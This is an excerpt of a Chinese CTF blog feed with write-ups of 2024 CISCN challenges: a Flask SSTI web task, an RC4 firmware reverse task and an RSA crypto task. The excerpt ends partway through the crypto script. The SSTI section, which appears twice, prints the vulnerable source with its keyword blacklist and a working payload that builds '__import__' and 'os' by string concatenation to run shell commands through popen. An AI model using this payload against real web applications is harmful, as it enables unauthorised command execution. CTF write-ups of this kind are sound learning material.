class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> html<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    template_code = request.form.get(<span class="hljs-string">&quot;code&quot;</span>)<br>    <span class="hljs-comment"># 安全过滤</span><br>    blacklist = [<span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>]<br>    <span class="hljs-keyword">for</span> black <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> black <span class="hljs-keyword">in</span> template_code:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Forbidden content detected!&quot;</span><br>    result = render_template_string(template_code)<br>    <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span> <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;error&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPProxyHandler</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_host, target_port</span>):<br>        <span class="hljs-variable language_">self</span>.target_host = target_host<br>        <span class="hljs-variable language_">self</span>.target_port = target_port<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_request</span>(<span class="hljs-params">self, client_socket</span>):<br>        <span class="hljs-keyword">try</span>:<br>            request_data = <span class="hljs-string">b&quot;&quot;</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                chunk = client_socket.recv(<span class="hljs-number">4096</span>)<br>                request_data += chunk<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(chunk) &lt; <span class="hljs-number">4096</span>:<br>                    <span class="hljs-keyword">break</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request_data:<br>                client_socket.close()<br>                <span class="hljs-keyword">return</span><br><br>            <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> proxy_socket:<br>                proxy_socket.connect((<span class="hljs-variable language_">self</span>.target_host, <span class="hljs-variable language_">self</span>.target_port))<br>                proxy_socket.sendall(request_data)<br><br>                response_data = <span class="hljs-string">b&quot;&quot;</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    chunk = proxy_socket.recv(<span class="hljs-number">4096</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk:<br>                        <span class="hljs-keyword">break</span><br>                    response_data += chunk<br><br>            header_end = response_data.rfind(<span class="hljs-string">b&quot;\r\n\r\n&quot;</span>)<br>            <span class="hljs-keyword">if</span> header_end != -<span class="hljs-number">1</span>:<br>                body = response_data[header_end + <span class="hljs-number">4</span>:]<br>            <span class="hljs-keyword">else</span>:<br>                body = response_data<br>                <br>            response_body = body<br>            response = <span class="hljs-string">b&quot;HTTP/1.1 200 OK\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;Content-Length: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(response_body)).encode() + <span class="hljs-string">b&quot;\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;Content-Type: text/html; charset=utf-8\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;\r\n&quot;</span> + response_body<br><br>            client_socket.sendall(response)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Proxy Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">finally</span>:<br>            client_socket.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_proxy_server</span>(<span class="hljs-params">host, port, target_host, target_port</span>):<br>    proxy_handler = HTTPProxyHandler(target_host, target_port)<br>    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    server_socket.bind((host, port))<br>    server_socket.listen(<span class="hljs-number">100</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Proxy server is running on <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span> and forwarding to <span class="hljs-subst">&#123;target_host&#125;</span>:<span class="hljs-subst">&#123;target_port&#125;</span>...&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            client_socket, addr = server_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Connection from <span class="hljs-subst">&#123;addr&#125;</span>&quot;</span>)<br>            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))<br>            thread.daemon = <span class="hljs-literal">True</span><br>            thread.start()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Shutting down proxy server...&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        server_socket.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_flask_app</span>():<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    proxy_host = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    proxy_port = <span class="hljs-number">5001</span><br>    target_host = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    target_port = <span class="hljs-number">5000</span><br><br>    <span class="hljs-comment"># 安全反代，防止针对响应头的攻击</span><br>    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))<br>    proxy_thread.daemon = <span class="hljs-literal">True</span><br>    proxy_thread.start()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting Flask app...&quot;</span>)<br>    run_flask_app()<br></code></pre></td></tr></table></figure><ul><li><code>Flask-SSTI</code>，形式有点像强网杯一个题目</li><li>把<code>flag</code>重定向到<code>app.py</code>上</li><li>绕过<code>blacklist = [&#39;__&#39;, &#39;import&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;eval&#39;, &#39;subprocess&#39;, &#39;popen&#39;, &#39;system&#39;, &#39;\r&#39;, &#39;\n&#39;]</code></li><li><code>__ -&gt; &#39;_&#39;+&#39;_&#39;</code></li><li><code>os -&gt; &#39;o&#39;+&#39;s&#39;</code></li></ul><p>最终<code>payload</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">code=&#123;%<span class="hljs-built_in">set</span> a=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;globals&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;builtins&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> c=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;impo&#x27;</span><span class="hljs-string">&#x27;rt&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> d=<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>%&#125;&#123;&#123;cycler.<span class="hljs-built_in">next</span>[a][b][c](d)[<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;cat ../../../flag &gt; app.py&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029756.png" alt="img"></p><ul><li>回退</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029730.png" alt="img"></p><p><strong>后续研究</strong></p><p>其实可以fenjing一把嗦，但是需要修改一下代码，改成有回显的。</p><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029578.png" alt="40a93733048c34b153835a040397d5d"></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">python</span> -<span class="hljs-string">m</span> <span class="hljs-string">fenjing</span> <span class="hljs-string">scan</span> <span class="hljs-built_in">--url</span> <span class="hljs-string">&quot;http://127.0.0.1:5000&quot;</span> <span class="hljs-built_in">--extra-data</span> <span class="hljs-string">&quot;code=1&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412200029651.png" alt="e55316d39cd823a891b32f1b9aad922"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024-CISCN-XU17</title>
    <link href="/2024/12/15/2024-CISCN-XU17/"/>
    <url>/2024/12/15/2024-CISCN-XU17/</url>
    
    <content type="html"><![CDATA[<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241829302.jpg" alt="20241104kUSnH7it5x"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Safe-proxy"><a href="#Safe-proxy" class="headerlink" title="Safe_proxy"></a>Safe_proxy</h3><p>访问页面，得到源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template_string<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> html<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>+html.escape(f.read())+<span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    template_code = request.form.get(<span class="hljs-string">&quot;code&quot;</span>)<br>    <span class="hljs-comment"># 安全过滤</span><br>    blacklist = [<span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>]<br>    <span class="hljs-keyword">for</span> black <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> black <span class="hljs-keyword">in</span> template_code:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Forbidden content detected!&quot;</span><br>    result = render_template_string(template_code)<br>    <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span> <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;error&#x27;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPProxyHandler</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, target_host, target_port</span>):<br>        <span class="hljs-variable language_">self</span>.target_host = target_host<br>        <span class="hljs-variable language_">self</span>.target_port = target_port<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_request</span>(<span class="hljs-params">self, client_socket</span>):<br>        <span class="hljs-keyword">try</span>:<br>            request_data = <span class="hljs-string">b&quot;&quot;</span><br>            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                chunk = client_socket.recv(<span class="hljs-number">4096</span>)<br>                request_data += chunk<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(chunk) &lt; <span class="hljs-number">4096</span>:<br>                    <span class="hljs-keyword">break</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> request_data:<br>                client_socket.close()<br>                <span class="hljs-keyword">return</span><br><br>            <span class="hljs-keyword">with</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM) <span class="hljs-keyword">as</span> proxy_socket:<br>                proxy_socket.connect((<span class="hljs-variable language_">self</span>.target_host, <span class="hljs-variable language_">self</span>.target_port))<br>                proxy_socket.sendall(request_data)<br><br>                response_data = <span class="hljs-string">b&quot;&quot;</span><br>                <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>                    chunk = proxy_socket.recv(<span class="hljs-number">4096</span>)<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> chunk:<br>                        <span class="hljs-keyword">break</span><br>                    response_data += chunk<br><br>            header_end = response_data.rfind(<span class="hljs-string">b&quot;\r\n\r\n&quot;</span>)<br>            <span class="hljs-keyword">if</span> header_end != -<span class="hljs-number">1</span>:<br>                body = response_data[header_end + <span class="hljs-number">4</span>:]<br>            <span class="hljs-keyword">else</span>:<br>                body = response_data<br>                <br>            response_body = body<br>            response = <span class="hljs-string">b&quot;HTTP/1.1 200 OK\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;Content-Length: &quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(response_body)).encode() + <span class="hljs-string">b&quot;\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;Content-Type: text/html; charset=utf-8\r\n&quot;</span> \<br>                       <span class="hljs-string">b&quot;\r\n&quot;</span> + response_body<br><br>            client_socket.sendall(response)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Proxy Error: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">finally</span>:<br>            client_socket.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start_proxy_server</span>(<span class="hljs-params">host, port, target_host, target_port</span>):<br>    proxy_handler = HTTPProxyHandler(target_host, target_port)<br>    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    server_socket.bind((host, port))<br>    server_socket.listen(<span class="hljs-number">100</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Proxy server is running on <span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span> and forwarding to <span class="hljs-subst">&#123;target_host&#125;</span>:<span class="hljs-subst">&#123;target_port&#125;</span>...&quot;</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            client_socket, addr = server_socket.accept()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Connection from <span class="hljs-subst">&#123;addr&#125;</span>&quot;</span>)<br>            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))<br>            thread.daemon = <span class="hljs-literal">True</span><br>            thread.start()<br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Shutting down proxy server...&quot;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        server_socket.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_flask_app</span>():<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">5000</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    proxy_host = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    proxy_port = <span class="hljs-number">5001</span><br>    target_host = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    target_port = <span class="hljs-number">5000</span><br><br>    <span class="hljs-comment"># 安全反代，防止针对响应头的攻击</span><br>    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))<br>    proxy_thread.daemon = <span class="hljs-literal">True</span><br>    proxy_thread.start()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Starting Flask app...&quot;</span>)<br>    run_flask_app()<br></code></pre></td></tr></table></figure><ul><li><code>Flask-SSTI</code>，形式有点像强网杯一个题目</li><li>把<code>flag</code>重定向到<code>app.py</code>上</li><li>绕过<code>blacklist = [&#39;__&#39;, &#39;import&#39;, &#39;os&#39;, &#39;sys&#39;, &#39;eval&#39;, &#39;subprocess&#39;, &#39;popen&#39;, &#39;system&#39;, &#39;\r&#39;, &#39;\n&#39;]</code></li><li><code>__ -&gt; &#39;_&#39;+&#39;_&#39;</code></li><li><code>os -&gt; &#39;o&#39;+&#39;s&#39;</code></li></ul><p>最终<code>payload</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">code=&#123;%<span class="hljs-built_in">set</span> a=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;globals&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;builtins&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> c=<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;impo&#x27;</span><span class="hljs-string">&#x27;rt&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> d=<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>%&#125;&#123;&#123;cycler.<span class="hljs-built_in">next</span>[a][b][c](d)[<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>](<span class="hljs-string">&#x27;cat ../../../flag &gt; app.py&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826160.png" alt="img"></p><ul><li>回退</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826093.png" alt="img"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ezCsky"><a href="#ezCsky" class="headerlink" title="ezCsky"></a>ezCsky</h3><ul><li>固件分析，<code>Motorola RCE</code>架构，<code>ida7.7</code>里没有对应的<code>type</code>，一个个试找了一个反编译效果最好的</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826033.png" alt="img"></p><ul><li>能识别出来的函数只有几个</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826991.png" alt="img"></p><ul><li><p>但是去翻翻看，能看到一个rc4_encrypt,cmp_result,main,大概能猜到意思</p></li><li><p>在main里翻到了几个特征串，大概理清了流程</p></li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826011.png" alt="img"></p><ul><li><p>用<code>“testkey”</code>进行<code>rc4</code>加密，在<code>cmp</code>中进行比较，密文在<code>unk_8AA0</code>里，往下面翻翻就能看到</p></li><li><p>去网站解密后，发现还不太对</p></li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826019.png" alt="img"></p><ul><li>发现最后一个是}，考虑还有个<code>xor</code>没用上，猜测是一个前后异或，回去读一读，大概对的上</li></ul><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412241826592.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">flag&#123;d0f5b330-9a74-11ef-9afd-acde48001122&#125;<br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="rasnd"><a href="#rasnd" class="headerlink" title="rasnd"></a>rasnd</h3><ul><li>第一部分 分析代码，得到如下关系</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">h1</span> = x1*p + y1 *q - <span class="hljs-number">0</span>x114<br><span class="hljs-attr">h2</span> = x2*p +y2 * q - <span class="hljs-number">0</span>x514<br></code></pre></td></tr></table></figure><ul><li>消去<code>p</code>后，只需要爆破<code>h1、h2</code>即可</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> *<br>c = <span class="hljs-number">2047025302632489558157986377411562383750242098507101091835107604805413439963651499324666753537268662411798999353368521616537455619541474396664247770819403320179057671372599818892198417715189001567277409117783983748271235004737860935969497729693964275961990646245389724322432112287310417469924363937852078540410479502868130356098508588355727424707732912060661787647639381326829675883881765220953147603356174168805562685038102366234920340464587909256209275021059297167327887262581448148603906439400710107536951684459877024176259067449629350804430963362618693698322831473282809815790044861282591070783004510688686543536</span><br>n = <span class="hljs-number">15920173700664937533872551211373259839660299468835236200963406447246081490116425338346880175793432609104986652164487679573546435542663593978091836423227699351391038307254973165725055211012599604697598457965776845260944492561088472287304875941686160337835563398666657256280956343977084300347919352519507817390748959649985567022862236579500096654959197540691900743410585789944175259198342315278161373891512170975014764014690048430767176042774918769605948250968099683007673337011895410534198101814351729062810555709406291719644174553645729624040667677828580430395394166441608908794433481917739937056295583112550096842829</span><br>a = <span class="hljs-number">1788191443423648314996962441836187430188972565635381393376017463408135062887872327752852694837772510240051857039862516257168171180534813011888460306819202855254313812259002208708003315009272616637706145101210351906671428324238878097469011217517290793242097541951393761641647697870262022422080159421238248852236227711616142536087708611893231058</span><br>b = <span class="hljs-number">4889435575009813953150459835380031496142967222940678447969658749487294768373783678917852904447599308535099664667524504039245726024439182695980458708722618855136931457891616586649484629257141009693449457099695131583806787115459724479919725740229105715779481332474441933271505987533267210176224331187382523048267185202782555789943574792505715301119230102640163860970042097004807825585559573355461122118412971402964101893600100934904032951444699944229492743037419616</span><br>e = <span class="hljs-number">0x10001</span><br><br><span class="hljs-keyword">for</span> x1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span 